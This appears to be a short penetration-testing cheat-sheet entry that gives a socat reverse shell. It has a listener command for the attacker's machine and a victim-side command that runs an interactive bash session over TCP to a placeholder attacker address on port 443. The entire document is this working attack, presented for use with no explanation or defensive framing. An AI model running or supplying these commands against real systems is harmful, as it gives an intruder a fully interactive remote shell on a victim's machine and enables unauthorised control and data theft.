# shell

* Socat

On your localhost (attacker):

```
socat file:`tty`,raw,echo=0 tcp-listen:443
```

On your victim:

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST_IP>:443
```
